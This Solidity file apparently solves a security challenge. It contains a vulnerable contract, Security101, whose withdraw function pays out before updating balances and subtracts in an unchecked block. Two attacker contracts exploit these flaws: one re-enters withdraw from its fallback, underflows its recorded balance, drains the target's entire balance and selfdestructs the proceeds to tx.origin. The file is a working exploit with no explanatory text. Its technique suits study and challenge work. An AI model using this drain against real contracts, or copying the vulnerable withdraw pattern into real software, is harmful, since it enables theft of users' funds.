// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.15;

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient funds");
        (bool ok, ) = msg.sender.call{ value: amount }("");
        require(ok, "transfer failed");
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

interface Target {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

contract OptimizedAttackerSecurity101 {
    constructor(Target target) payable {
        OptimizedAttackerSecurity102 attacker = new OptimizedAttackerSecurity102{ value: msg.value }(target);
        attacker.attack(target);
    }
}

contract OptimizedAttackerSecurity102 {
    constructor(Target target) payable{
        target.deposit{ value: msg.value }();
    }
    function attack(Target target) external payable {
        target.withdraw(1 ether);
        target.withdraw(address(target).balance);
        selfdestruct(payable(tx.origin));
    }

    fallback() external payable {
        if (address(this).balance == msg.value) {
            Target(msg.sender).withdraw(msg.value);
        }
    }
}

